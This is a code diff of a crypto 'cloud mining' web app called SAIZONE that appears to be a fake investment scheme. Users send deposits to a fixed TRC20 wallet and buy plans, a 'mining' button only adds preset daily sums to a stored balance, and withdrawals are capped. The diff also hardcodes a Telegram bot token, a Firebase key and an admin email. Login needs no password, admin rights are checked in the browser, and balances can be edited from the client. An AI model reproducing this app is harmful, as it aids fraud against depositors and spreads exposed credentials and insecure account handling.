@@ -3,71 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>SAIZONE | MASTER EDITION 2026</title>
+    <title>SAIZONE | CLOUD MASTER EDITION</title>
     
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
 
     <style>
-        :root { 
-            --bg: #030303; 
-            --card-bg: rgba(17, 17, 17, 0.98); 
-            --accent: #3b82f6; 
-            --glow: rgba(59, 130, 246, 0.6);
-            --border: rgba(255, 255, 255, 0.1);
-        }
-        
+        :root { --bg: #030303; --card-bg: rgba(17, 17, 17, 0.98); --accent: #3b82f6; --glow: rgba(59, 130, 246, 0.6); --border: rgba(255, 255, 255, 0.1); }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: 'Cairo', sans-serif; }
-        
-        body, html { 
-            margin: 0; padding: 0; height: 100%; width: 100%; 
-            background: var(--bg); color: #fff; overflow: hidden;
-            background-image: radial-gradient(circle at top right, #0a192f, transparent), radial-gradient(circle at bottom left, #050505, transparent);
-        }
-
-        .card { 
-            background: var(--card-bg); 
-            border-radius: 24px; padding: 22px; margin-bottom: 15px; 
-            border: 1px solid var(--border);
-            box-shadow: 0 15px 40px rgba(0,0,0,0.8);
-            position: relative; backdrop-filter: blur(20px);
-            z-index: 10;
-        }
-
-        .card::after {
-            content: ""; position: absolute; inset: -1px; border-radius: 24px; padding: 1px;
-            background: linear-gradient(135deg, var(--accent), transparent, var(--accent));
-            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-            -webkit-mask-composite: xor; mask-composite: exclude; opacity: 0.4;
-            pointer-events: none;
-        }
-
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; background: var(--bg); color: #fff; overflow: hidden; background-image: radial-gradient(circle at top right, #0a192f, transparent), radial-gradient(circle at bottom left, #050505, transparent); }
+        .card { background: var(--card-bg); border-radius: 24px; padding: 22px; margin-bottom: 15px; border: 1px solid var(--border); box-shadow: 0 15px 40px rgba(0,0,0,0.8); position: relative; backdrop-filter: blur(20px); z-index: 10; }
+        .card::after { content: ""; position: absolute; inset: -1px; border-radius: 24px; padding: 1px; background: linear-gradient(135deg, var(--accent), transparent, var(--accent)); -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0); mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0); -webkit-mask-composite: xor; mask-composite: exclude; opacity: 0.4; pointer-events: none; }
         .page { display: none; height: 100dvh; padding: 20px; overflow-y: auto; padding-bottom: 120px; position: relative; z-index: 20; }
         .page.active { display: block; animation: fadeIn 0.3s ease-out; }
-
-        #miningPage.active, #supportPage.active, #depositPage.active, #withdrawPage.active { 
-            display: flex; align-items: center; justify-content: center; flex-direction: column; 
-        }
-
+        #miningPage.active, #supportPage.active, #depositPage.active, #withdrawPage.active { display: flex; align-items: center; justify-content: center; flex-direction: column; }
         nav { position: fixed; bottom: 0; width: 100%; background: rgba(5, 5, 5, 0.98); backdrop-filter: blur(25px); display: none; justify-content: space-around; padding: 14px 0; border-top: 1px solid var(--border); z-index: 10000; }
         .nav-item { color: #555; font-size: 10px; text-align: center; flex: 1; cursor: pointer; transition: 0.3s; }
         .nav-item.active { color: var(--accent); text-shadow: 0 0 15px var(--glow); transform: translateY(-3px); }
-
         .input-style { width: 100%; background: rgba(255, 255, 255, 0.05); border: 1px solid var(--border); border-radius: 18px; padding: 14px; color: #fff; outline: none; margin-bottom: 12px; text-align: center; font-size: 14px; position: relative; z-index: 30; }
-        
         .btn-3d { background: linear-gradient(145deg, #3b82f6, #1d4ed8); box-shadow: 0 8px 25px var(--glow); border: none; border-radius: 18px; font-weight: 900; transition: 0.2s; color: white; cursor: pointer; position: relative; z-index: 40; }
         .btn-3d:active { transform: scale(0.95); opacity: 0.9; }
-
         #adminModal { position: fixed; inset: 0; background: rgba(0,0,0,0.96); display: none; align-items: center; justify-content: center; z-index: 200000; padding: 20px; backdrop-filter: blur(20px); }
-        
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         #toast { position: fixed; top: 40px; left: 50%; transform: translateX(-50%); background: #fff; color: #000; padding: 12px 35px; border-radius: 50px; z-index: 300000; display: none; font-weight: 900; font-size: 12px; pointer-events: none; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
     </style>
 </head>
 <body>
-
     <div id="toast"></div>
 
     <div id="adminModal" onclick="if(event.target == this) closeAdminModal()">
@@ -102,62 +66,27 @@
                 <h2 id="userNameDisplay" class="font-black text-2xl uppercase tracking-tight">---</h2>
                 <p id="userIdDisplay" class="text-[11px] text-gray-500 font-mono">UID: 000000</p>
             </div>
-
             <div class="card !py-6 text-center">
                 <h4 class="text-[12px] font-black text-blue-500 uppercase mb-3 tracking-widest">Referral Program</h4>
-                <p class="text-[10px] text-gray-400 mb-4">شارك الرابط مع أصدقائك للحصول على مكافآت</p>
                 <button onclick="copyRefLink()" class="w-full bg-blue-600/10 border border-blue-500/20 py-3 rounded-2xl text-[11px] text-blue-400 font-black uppercase flex items-center justify-center gap-3">
                     <i class="fa-solid fa-share-nodes text-lg"></i> نسخ رابط الإحالة
                 </button>
             </div>
-
             <div class="card !py-8">
                 <div class="flex justify-between items-center">
-                    <div>
-                        <p class="text-[11px] text-gray-400 font-bold mb-1 uppercase">Total Balance</p>
-                        <h3 class="text-4xl font-black text-blue-500">$<span id="pBalance">0.00</span></h3>
-                    </div>
+                    <div><p class="text-[11px] text-gray-400 font-bold mb-1 uppercase">Total Balance</p><h3 class="text-4xl font-black text-blue-500">$<span id="pBalance">0.00</span></h3></div>
                     <span id="currentPlan" class="text-[10px] font-bold text-white bg-blue-600 px-4 py-2 rounded-2xl italic">No Plan</span>
                 </div>
-                <div id="masterAdminPanel" style="display:none;" class="mt-8 pt-4 border-t border-white/5">
-                    <button onclick="openAdminModal()" class="w-full btn-3d py-4 text-[11px] uppercase tracking-widest">Master Admin Access</button>
-                </div>
+                <div id="masterAdminPanel" style="display:none;" class="mt-8 pt-4 border-t border-white/5"><button onclick="openAdminModal()" class="w-full btn-3d py-4 text-[11px] uppercase tracking-widest">Master Admin Access</button></div>
             </div>
             <button onclick="logout()" class="w-full mt-4 py-3 text-red-500 text-[10px] font-bold border border-red-500/10 rounded-2xl bg-red-500/5 uppercase">Sign Out</button>
         </div>
 
         <div id="plansPage" class="page"><div id="plansList" class="grid grid-cols-1 gap-4"></div></div>
-
-        <div id="miningPage" class="page">
-            <div class="card text-center !m-0 w-full max-w-[300px] !py-16">
-                <i class="fa-solid fa-microchip text-7xl text-blue-500 mb-8 animate-pulse"></i>
-                <button onclick="doMining()" class="w-full btn-3d py-4 text-sm uppercase tracking-widest">Start Daily Cycle</button>
-            </div>
-        </div>
-
-        <div id="depositPage" class="page">
-            <div class="card text-center w-full max-w-[340px]">
-                <p class="text-[10px] text-blue-400 mb-6 font-mono break-all px-4 bg-black/40 py-4 rounded-xl">TTmVnVwGtMm11BkxJA7LYitCgfTqoSN8dw</p>
-                <input type="number" id="depAmount" placeholder="أدخل مبلغ الإيداع ($)" class="input-style">
-                <button onclick="sendToBot('deposit')" class="w-full btn-3d py-4 text-xs uppercase tracking-widest">Confirm Deposit</button>
-            </div>
-        </div>
-
-        <div id="withdrawPage" class="page">
-            <div class="card w-full max-w-[340px]">
-                <input type="text" id="witAddress" placeholder="Wallet Address (TRC20)" class="input-style">
-                <input type="number" id="witAmount" placeholder="Minimum $5" class="input-style">
-                <button onclick="sendToBot('withdraw')" class="w-full btn-3d py-4 text-xs uppercase tracking-widest">Confirm Withdrawal</button>
-            </div>
-        </div>
-
-        <div id="supportPage" class="page">
-            <div class="card text-center w-full max-w-[300px] !py-12">
-                <i class="fa-brands fa-telegram text-6xl text-blue-500 mb-6"></i>
-                <h3 class="text-xl font-black mb-6 uppercase">Need Help?</h3>
-                <button onclick="window.open('https://t.me/Hassan20005pp_bot')" class="w-full btn-3d py-4 text-sm">Contact Support</button>
-            </div>
-        </div>
+        <div id="miningPage" class="page"><div class="card text-center !m-0 w-full max-w-[300px] !py-16"><i class="fa-solid fa-microchip text-7xl text-blue-500 mb-8 animate-pulse"></i><button onclick="doMining()" class="w-full btn-3d py-4 text-sm uppercase tracking-widest">Start Daily Cycle</button></div></div>
+        <div id="depositPage" class="page"><div class="card text-center w-full max-w-[340px]"><p class="text-[10px] text-blue-400 mb-6 font-mono break-all px-4 bg-black/40 py-4 rounded-xl">TTmVnVwGtMm11BkxJA7LYitCgfTqoSN8dw</p><input type="number" id="depAmount" placeholder="أدخل مبلغ الإيداع ($)" class="input-style"><button onclick="sendToBot('deposit')" class="w-full btn-3d py-4 text-xs uppercase tracking-widest">Confirm Deposit</button></div></div>
+        <div id="withdrawPage" class="page"><div class="card w-full max-w-[340px]"><input type="text" id="witAddress" placeholder="Wallet Address (TRC20)" class="input-style"><input type="number" id="witAmount" placeholder="Minimum $5" class="input-style"><button onclick="sendToBot('withdraw')" class="w-full btn-3d py-4 text-xs uppercase tracking-widest">Confirm Withdrawal</button></div></div>
+        <div id="supportPage" class="page"><div class="card text-center w-full max-w-[300px] !py-12"><i class="fa-brands fa-telegram text-6xl text-blue-500 mb-6"></i><button onclick="window.open('https://t.me/Hassan20005pp_bot')" class="w-full btn-3d py-4 text-sm">Contact Support</button></div></div>
 
         <nav id="bottomNav">
             <div class="nav-item active" onclick="tabNav(this, 'profilePage')"><i class="fa-solid fa-user-shield text-xl mb-1"></i><br>Profile</div>
@@ -170,6 +99,19 @@
     </div>
 
     <script>
+        // تكوين Firebase الخاص بك
+        const firebaseConfig = {
+            apiKey: "AIzaSyAm1HgB2sfBFwfu52RI0pN7lfWk3oHPAQM",
+            authDomain: "saizone-e9d5c.firebaseapp.com",
+            databaseURL: "https://saizone-e9d5c-default-rtdb.firebaseio.com",
+            projectId: "saizone-e9d5c",
+            storageBucket: "saizone-e9d5c.firebasestorage.app",
+            messagingSenderId: "203563761340",
+            appId: "1:203563761340:web:03fb1fc3c77dabb4355ab9"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
         const MASTER_ADMIN = "abwk18468@gmail.com";
         const BOT_TOKEN = "8548855381:AAE0ENEyVbRHAq-w75gIqHK1TmKV6A1pSXo";
         const CHAT_ID = "8575658586";
@@ -188,62 +130,51 @@
                 msg = `📥 طلب إيداع\n👤 ${userData.name}\n🆔 UID: ${userData.id}\n💵 المبلغ: $${am}`;
             } else {
                 const now = Date.now();
-                const fourteenDays = 14 * 24 * 60 * 60 * 1000;
-                
-                if (userData.lastWithdraw && (now - userData.lastWithdraw < fourteenDays)) {
-                    const diff = fourteenDays - (now - userData.lastWithdraw);
-                    const days = Math.ceil(diff / (24 * 60 * 60 * 1000));
-                    return showToast(`مرفوض! يمكنك السحب بعد ${days} يوم`);
+                if (userData.lastWithdraw && (now - userData.lastWithdraw < 14 * 24 * 60 * 60 * 1000)) {
+                    return showToast(`مرفوض! يمكنك السحب كل 14 يوم`);
                 }
-
                 const ad = document.getElementById('witAddress').value;
                 const am = document.getElementById('witAmount').value;
-                if(!ad || am < 5) return showToast("بيانات السحب غير كافية");
-                if(parseFloat(am) > userData.balance) return showToast("رصيدك غير كافٍ");
-                
+                if(!ad || am < 5 || am > userData.balance) return showToast("بيانات غير صحيحة");
                 msg = `💰 طلب سحب\n👤 ${userData.name}\n🆔 UID: ${userData.id}\n💵 المبلغ: $${am}\n🏦 العنوان: ${ad}`;
             }
-
             try {
-                showToast("جاري إرسال الطلب...");
+                showToast("جاري الإرسال...");
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-                showToast("تم الإرسال بنجاح ✅");
-                if(type === 'withdraw') { 
-                    userData.balance -= parseFloat(document.getElementById('witAmount').value);
-                    userData.lastWithdraw = Date.now();
-                    save(); 
-                }
-            } catch(e) { showToast("فشل الاتصال بالبوت"); }
+                if(type==='withdraw') { userData.balance -= parseFloat(document.getElementById('witAmount').value); userData.lastWithdraw = Date.now(); save(); }
+                showToast("تم بنجاح ✅");
+            } catch(e) { showToast("خطأ في الاتصال"); }
         }
 
-        function executeAdminAction(type) {
+        async function executeAdminAction(type) {
             const tid = document.getElementById('adminTargetId').value;
-            let db = JSON.parse(localStorage.getItem('saizone_db') || '{}');
-            let tEmail = Object.keys(db).find(k => db[k].id == tid);
-            if(!tEmail) return showToast("UID غير موجود");
-
-            if(type === 'balance') db[tEmail].balance += parseFloat(document.getElementById('adminAmount').value || 0);
-            if(type === 'freeze') db[tEmail].isFrozen = !db[tEmail].isFrozen;
+            const snap = await db.ref('users/' + tid).once('value');
+            const target = snap.val();
+            if(!target) return showToast("UID غير موجود في السحابة");
+            if(type === 'balance') target.balance += parseFloat(document.getElementById('adminAmount').value || 0);
+            if(type === 'freeze') target.isFrozen = !target.isFrozen;
             if(type === 'plan') {
-                const lv = parseInt(document.getElementById('adminPlanLv').value);
-                const p = plans.find(x => x.id === lv);
-                if(p) { db[tEmail].plan = p.n; db[tEmail].planId = p.id; db[tEmail].daily = p.d; }
+                const p = plans.find(x => x.id == document.getElementById('adminPlanLv').value);
+                if(p) { target.plan = p.n; target.planId = p.id; target.daily = p.d; }
             }
-            localStorage.setItem('saizone_db', JSON.stringify(db));
-            if(userData.email === tEmail) { userData = db[tEmail]; updateUI(); }
-            showToast("تم التحديث بنجاح ✅");
+            await db.ref('users/' + tid).set(target);
+            if(userData.id == tid) { userData = target; updateUI(); }
+            showToast("تم تحديث السحابة ✅");
         }
 
-        function handleLogin() {
+        async function handleLogin() {
             const e = document.getElementById('email').value.trim().toLowerCase();
-            if(!e) return showToast("يرجى إدخال البريد");
-            let db = JSON.parse(localStorage.getItem('saizone_db') || '{}');
-            if(!db[e]) {
-                db[e] = { email: e, name: e.split('@')[0], balance: 0, daily: 0, plan: "No Plan", planId: 0, lastMine: "", id: Math.floor(100000 + Math.random() * 900000), isFrozen: false, lastWithdraw: 0 };
-                localStorage.setItem('saizone_db', JSON.stringify(db));
+            if(!e) return showToast("أدخل البريد");
+            const snap = await db.ref('users').once('value');
+            const allUsers = snap.val() || {};
+            let found = Object.values(allUsers).find(u => u.email === e);
+            if(!found) {
+                const uid = Math.floor(100000 + Math.random() * 900000);
+                found = { email: e, name: e.split('@')[0], balance: 0, daily: 0, plan: "No Plan", planId: 0, lastMine: "", id: uid, isFrozen: false, lastWithdraw: 0 };
+                await db.ref('users/' + uid).set(found);
             }
-            userData = db[e];
-            localStorage.setItem('saizone_current', e);
+            userData = found;
+            localStorage.setItem('saizone_uid', userData.id);
             document.getElementById('authPage').style.display = 'none';
             document.getElementById('mainApp').style.display = 'block';
             document.getElementById('bottomNav').style.display = 'flex';
@@ -262,52 +193,34 @@
             const l = document.getElementById('plansList'); l.innerHTML = "";
             plans.forEach(pl => {
                 const isC = userData.planId === pl.id;
-                l.innerHTML += `<div class="card text-center"><h4 class="font-black text-blue-500 text-xs mb-1 uppercase tracking-tighter">${pl.n}</h4><p class="text-[10px] text-gray-400 mb-4">$${pl.p} | $${pl.d}/Day</p><button onclick="buyPlan(${pl.id},'${pl.n}',${pl.p},${pl.d})" class="w-full btn-3d py-2 text-[10px] uppercase" ${isC ? 'disabled' : ''}>${isC ? 'Activated' : 'Buy Plan'}</button></div>`;
+                l.innerHTML += `<div class="card text-center"><h4 class="font-black text-blue-500 text-xs mb-1 uppercase">${pl.n}</h4><p class="text-[10px] text-gray-400 mb-4">$${pl.p} | $${pl.d}/Day</p><button onclick="buyPlan(${pl.id},'${pl.n}',${pl.p},${pl.d})" class="w-full btn-3d py-2 text-[10px] uppercase" ${isC ? 'disabled' : ''}>${isC ? 'Activated' : 'Buy Plan'}</button></div>`;
             });
         }
 
         function buyPlan(id, n, p, d) { 
-            if(userData.balance < p) return showToast("رصيدك منخفض جداً");
+            if(userData.balance < p) return showToast("رصيد منخفض");
             userData.balance -= p; userData.plan = n; userData.planId = id; userData.daily = d;
-            save(); initPlans(); showToast("تم تفعيل الخطة بنجاح ✅");
+            save(); initPlans();
         }
 
         function doMining() {
-            if(userData.planId === 0) return showToast("اشترك في خطة أولاً");
-            if(userData.lastMine === new Date().toDateString()) return showToast("أكملت التعدين لليوم");
-            
-            // إضافة الأرباح إلى الرصيد فوراً
-            userData.balance += userData.daily; 
-            userData.lastMine = new Date().toDateString();
-            
-            save(); 
-            showToast(`تمت إضافة $${userData.daily} إلى رصيدك ✅`);
+            if(userData.planId === 0 || userData.lastMine === new Date().toDateString()) return showToast("تنبيه: لا يمكنك التعدين");
+            userData.balance += userData.daily; userData.lastMine = new Date().toDateString();
+            save(); showToast(`تمت إضافة $${userData.daily} ✅`);
         }
 
-        function save() {
-            let db = JSON.parse(localStorage.getItem('saizone_db') || '{}');
-            db[userData.email] = userData;
-            localStorage.setItem('saizone_db', JSON.stringify(db));
-            updateUI();
-        }
-
-        function copyRefLink() {
-            const link = window.location.href.split('#')[0] + "#ref=" + userData.id;
-            navigator.clipboard.writeText(link); showToast("تم نسخ رابط الإحالة ✅");
-        }
-
-        function tabNav(el, p) { 
-            document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active')); 
-            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); 
-            document.getElementById(p).classList.add('active'); el.classList.add('active'); 
-        }
-
-        function logout() { localStorage.removeItem('saizone_current'); location.reload(); }
+        function save() { db.ref('users/' + userData.id).set(userData); updateUI(); }
+        function copyRefLink() { navigator.clipboard.writeText(window.location.href.split('#')[0] + "#ref=" + userData.id); showToast("تم النسخ ✅"); }
+        function tabNav(el, p) { document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active')); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); document.getElementById(p).classList.add('active'); el.classList.add('active'); }
+        function logout() { localStorage.removeItem('saizone_uid'); location.reload(); }
         function showToast(m) { const t = document.getElementById('toast'); t.innerText = m; t.style.display = 'block'; setTimeout(()=>t.style.display='none', 2500); }
 
-        window.onload = () => { 
-            const se = localStorage.getItem('saizone_current');
-            if(se) { document.getElementById('email').value = se; handleLogin(); }
+        window.onload = async () => { 
+            const savedUid = localStorage.getItem('saizone_uid');
+            if(savedUid) {
+                const snap = await db.ref('users/' + savedUid).once('value');
+                if(snap.exists()) { userData = snap.val(); document.getElementById('authPage').style.display = 'none'; document.getElementById('mainApp').style.display = 'block'; document.getElementById('bottomNav').style.display = 'flex'; if(userData.email === MASTER_ADMIN) document.getElementById('masterAdminPanel').style.display = 'block'; initPlans(); updateUI(); }
+            }
         };
     </script>
 </body>
